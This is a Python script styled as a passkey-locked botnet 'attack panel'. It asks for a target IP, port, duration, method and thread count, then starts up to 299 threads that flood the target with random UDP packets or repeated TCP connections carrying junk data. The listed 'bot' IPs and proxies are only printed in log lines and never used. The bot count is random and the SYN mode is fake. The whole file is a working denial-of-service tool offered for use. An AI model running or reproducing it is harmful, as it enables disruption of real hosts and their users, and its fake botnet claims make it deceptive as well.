import socket
import threading
import time
import random
import os
from colorama import Fore, Style

real_ipv4_list = [
    "73.162.84.19", "98.114.204.51", "174.58.152.133", "67.180.13.24",
    "24.5.119.233", "99.232.138.45", "24.36.74.18", "142.114.214.89",
    "69.159.83.22", "64.231.169.204", "96.44.189.78", "70.79.234.112",
    "99.245.161.33", "24.114.122.57", "174.91.63.144", "65.94.182.200",
    "24.141.176.21", "174.95.217.10", "50.71.89.27", "184.151.36.248",
    "68.146.238.112", "75.157.92.61", "69.70.122.140", "67.193.106.118",
    "76.71.192.59", "104.223.25.144", "96.37.255.242", "174.2.71.33",
    "24.142.11.66", "68.149.199.82", "70.29.24.175", "174.118.23.93"
]

proxy_list = [
    "104.243.32.29:1080", "98.162.25.16:4145", "184.178.172.14:4145",
    "67.201.33.10:25283", "72.195.34.35:4145", "174.77.111.197:4145",
    "98.162.96.53:4145", "50.114.128.13:8080", "104.223.90.24:8080",
    "192.210.230.42:8080", "107.191.62.250:8080", "185.199.231.45:3128",
    "51.158.68.68:8811", "51.91.144.39:8080", "51.79.144.52:8080"
]

MAX_THREADS = 299
MAX_DURATION = 300

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def valid_passkey():
    return input(Fore.GREEN + "Passkey: ") == "bot0"

def show_bots_online():
    print(Fore.MAGENTA + "Checking Bots", end="", flush=True)
    for _ in range(3):
        time.sleep(0.4)
        print(".", end="", flush=True)
    time.sleep(0.3)
    print(f"\r{Fore.CYAN}Active Bots: {random.randint(1, 222)}      {Style.RESET_ALL}")

def print_menu():
    clear_screen()
    print("\033[1;35m" + r"""
    Made by: Lemonaidd

 ███▄ ▄███▓▓██   ██▓    ███▄    █ ▓█████▄▄▄█████▓
▓██▒▀█▀ ██▒ ▒██  ██▒    ██ ▀█   █ ▓█   ▀▓  ██▒ ▓▒
▓██    ▓██░  ▒██ ██░   ▓██  ▀█ ██▒▒███  ▒ ▓██░ ▒░
▒██    ▒██   ░ ▐██▓░   ▓██▒  ▐▌██▒▒▓█  ▄░ ▓██▓ ░ 
▒██▒   ░██▒  ░ ██▒▓░   ▒██░   ▓██░░▒████▒ ▒██▒ ░ 
░ ▒░   ░  ░   ██▒▒▒    ░ ▒░   ▒ ▒ ░░ ▒░ ░ ▒ ░░   
░  ░      ░ ▓██ ░▒░    ░ ░░   ░ ▒░ ░ ░  ░   ░    
░      ░    ▒ ▒ ░░        ░   ░ ░    ░    ░      
       ░    ░ ░                 ░    ░  ░        
            ░ ░                                  
    """ + "\033[0m")
    show_bots_online()
    print(Fore.GREEN + "1. Attack IP\n2. Exit" + Style.RESET_ALL)

def random_bot_ip():
    return f"{random.choice(real_ipv4_list)}:22"

def random_proxy():
    return random.choice(proxy_list)

def method_selection():
    while True:
        choice = input(Fore.CYAN + "Method (tcp/udp/syn): ").strip().lower()
        if choice in ["tcp", "udp", "syn"]:
            return choice
        print(Fore.RED + "Invalid. Use tcp, udp, or syn.")

def attack_thread(ip, port, duration, method):
    end = time.time() + duration
    payload = random._urandom(1024)
    proxy = random_proxy()

    while time.time() < end:
        bot_ip = random_bot_ip()
        try:
            if method == "udp":
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(payload, (ip, port))
                print(f"\033[1;35m[UDP] {ip}:{port} from {bot_ip} via proxy {proxy}\033[0m")
                sock.close()
            elif method == "tcp":
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)
                sock.connect((ip, port))
                sock.send(payload[:64])
                print(f"\033[1;35m[TCP] {ip}:{port} from {bot_ip} via proxy {proxy}\033[0m")
                sock.close()
            elif method == "syn":
                print(f"\033[1;35m[SYN] {ip}:{port} from {bot_ip} (simulated)\033[0m")
        except Exception as e:
            print(Fore.RED + f"Error: {e}")

        time.sleep(0.3)

def start_attack(ip, port, duration, method, threads=50):
    thread_list = []
    for _ in range(min(threads, MAX_THREADS)):
        t = threading.Thread(target=attack_thread, args=(ip, port, min(duration, MAX_DURATION), method))
        t.daemon = True
        t.start()
        thread_list.append(t)
    for t in thread_list:
        t.join()

def menu():
    while True:
        print_menu()
        opt = input(Fore.CYAN + "Option: ").strip()
        if opt == "1":
            ip = input(Fore.CYAN + "Target IP: ")
            port = int(input(Fore.CYAN + "Port: "))
            dur = int(input(Fore.CYAN + f"Duration (max {MAX_DURATION}s): "))
            dur = min(dur, MAX_DURATION)
            method = method_selection()
            threads = int(input(Fore.CYAN + f"Threads (max {MAX_THREADS}): "))
            threads = min(threads, MAX_THREADS)
            start_attack(ip, port, dur, method, threads)
            input(Fore.CYAN + "Press Enter...")
        elif opt == "2":
            break
        else:
            print(Fore.RED + "Invalid option.")

if __name__ == "__main__":
    if valid_passkey():
        menu()
    else:
        print(Fore.RED + "Invalid passkey.")
